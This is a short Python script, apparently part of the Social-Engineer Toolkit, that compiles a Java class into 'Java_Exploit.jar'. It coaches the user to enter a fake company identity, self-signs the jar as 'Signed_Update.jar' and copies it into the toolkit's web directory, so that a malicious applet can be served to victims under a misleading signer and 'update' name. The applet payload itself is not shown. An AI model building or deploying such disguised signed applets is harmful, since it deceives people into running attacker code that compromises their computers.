#!/usr/bin/python
#
# simple jar file
#
import subprocess
subprocess.Popen("javac Java.java", shell=True).wait()
subprocess.Popen("jar cvf Java_Exploit.jar Java.class", shell=True).wait()
print "[*] Jar file exported as Java_Exploit.jar"
pause = raw_input("[*] Do you want to sign and import the new java file into SET, yes or no: ")
if pause == "yes" or pause == "y":
	print """
Simply enter in the required fields, easy example below:

Name: FakeCompany
Organization: Fake Company
Organization Name: Fake Company
City: Cleveland
State: Ohio
Country: US
Is this correct: yes

"""
	print """*** WARNING ***\nIN ORDER FOR THIS TO WORK YOU MUST INSTALL sun-java6-jdk or openjdk-6-jdk, so apt-get install openjdk-6-jdk\n*** WARNING ***"""
	# grab keystore to use later
	subprocess.Popen("keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mystorepass", shell=True).wait()
	# self-sign the applet
	subprocess.Popen("jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar Signed_Update.jar Java_Exploit.jar signapplet", shell=True).wait()
	# move it into our html directory
	subprocess.Popen("cp Signed_Update.jar ../../html/", shell=True).wait()
	print "[*] New java applet has been successfully imported into The Social-Engineer Toolkit (SET)"
